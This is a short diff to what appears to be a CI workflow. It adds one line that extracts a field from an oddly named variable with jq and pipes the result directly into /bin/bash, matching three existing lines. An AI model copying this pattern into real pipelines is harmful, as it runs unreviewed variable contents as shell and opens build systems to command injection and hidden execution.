@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$y560" | jq -r .qufpi580 | /bin/bash
           echo $lz9 | jq -r .rdgfx563 | /bin/bash
           echo $p553 | jq -r .ziexi941 | /bin/bash
+          printf '%s' "$dul26" | jq -r .u64 | /bin/bash
 
       - name: Save output
         if: always()
